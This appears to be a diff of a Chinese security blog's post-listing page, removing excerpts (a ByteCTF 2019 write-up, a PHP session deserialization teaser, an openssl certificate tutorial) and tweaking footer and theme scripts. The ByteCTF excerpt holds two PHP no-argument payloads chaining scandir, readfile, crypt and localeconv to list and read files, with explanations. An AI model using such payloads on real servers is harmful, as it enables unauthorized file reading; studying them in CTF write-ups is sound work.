-if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv())))))))))))); 这两个payload都很精彩, 涉及的知识点如下:
-crypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.
-ord函数传入字符串的时候, 只返回第一个字符的ascii码
-localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是&#34;小数点字符&#34;, 也就是点号
-php &gt; var_dump(localeconv()); array(18) { [&#34;decimal_point&#34;]=&gt; string(1) &#34;.&#34; [&#34;thousands_sep&#34;]=&gt; string(0) &#34;&#34; [&#34;int_curr_symbol&#34;]=&gt; string(0) &#34;&#34; [&#34;currency_symbol&#34;]=&gt; string(0) &#34;&#34; [&#34;mon_decimal_point&#34;]=&gt; string(0) &#34;&#34; [&#34;mon_thousands_sep&#34;]=&gt; string(0) &#34;&#34; [&#34;positive_sign&#34;]=&gt; string(0) &#34;&#34; [&#34;negative_sign&#34;]=&gt; string(0) &#34;&#34; [&#34;int_frac_digits&#34;]=&gt; int(127) [&#34;frac_digits&#34;]=&gt; int(127) [&#34;p_cs_precedes&#34;]=&gt; int(127) [&#34;p_sep_by_space&#34;]=&gt; int(127) [&#34;n_cs_precedes&#34;]=&gt; int(127) [&#34;n_sep_by_space&#34;]=&gt; int(127) [&#34;p_sign_posn&#34;]=&gt; int(127) [&#34;n_sign_posn&#34;]=&gt; int(127) [&#34;grouping&#34;]=&gt; array(0) { } [&#34;mon_grouping&#34;]=&gt; array(0) { } } php &gt; pos() 函数是current函数的别名
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2019-09-09 08:18:25 +0000 UTC'>September 9, 2019</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;787 words&nbsp;·&nbsp;ch4ser</footer>
-  <a class="entry-link" aria-label="post link to bytectf2019" href="https://dragonbox.top/posts/ctf-bytectf2019/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">php session反序列化
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2019-09-02 13:40:59 +0000 UTC'>September 2, 2019</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;369 words&nbsp;·&nbsp;ch4ser</footer>
-  <a class="entry-link" aria-label="post link to php session反序列化" href="https://dragonbox.top/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">证书相关
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> 来看看互联网世界的基石
-通信过程的简化模型 第一阶段: 服务器向CA发起证书签名请求 服务器组织生成一个私钥
-openssl genrsa -out target.key 1024 从私钥文件中得到公钥, 这个公钥会被用于给CA签名
-openssl rsa -in target.key -pubout -out target_pub.key 使用私钥生成一个证书签名请求, 在生成过程中需要填写证书申请人的一些信息
-openssl req -new -key target.key -out target.csr 生成完成后, 可以运行下面命令看看这个证书签名请求文件里都有什么
-openssl req -text -in target.csr -verify 例如:
-可以看到公钥也在里面.
-接下来把证书签名请求文件提交给CA, CA审核通过后对该文件进行签名
-openssl x509 -in target.csr -out target.crt -req -signkey ca.key -days 365 target.crt就是签名成功后的证书. 对于常见的自签名场景来说, ca.key就是target.key, 用自己的密钥去签名自己的证书请求, 自签名请求命令就是
-openssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 然后CA将target.crt以及由Root CA签名的CA证书一同返回给申请人. 如下图所示:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2019-09-01 15:23:10 +0000 UTC'>September 1, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;574 words&nbsp;·&nbsp;ch4ser</footer>
-  <a class="entry-link" aria-label="post link to 证书相关" href="https://dragonbox.top/posts/tech-openssl/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
@@ -513,7 +498,7 @@ openssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 �
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
+        <span>&copy; 2026 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
 
     <span>
         Powered by
@@ -528,9 +513,14 @@ openssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 �
 </a>
 
 <script>
-    let menu = document.getElementById('menu')
+    let menu = document.getElementById('menu');
     if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
         menu.onscroll = function () {
             localStorage.setItem("menu-scroll-position", menu.scrollLeft);
         }
@@ -571,11 +561,12 @@ openssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 �
 </script>
 <script>
     document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
             localStorage.setItem("pref-theme", 'light');
         } else {
-            document.body.classList.add('dark');
+            html.dataset.theme = 'dark';
             localStorage.setItem("pref-theme", 'dark');
         }
     })
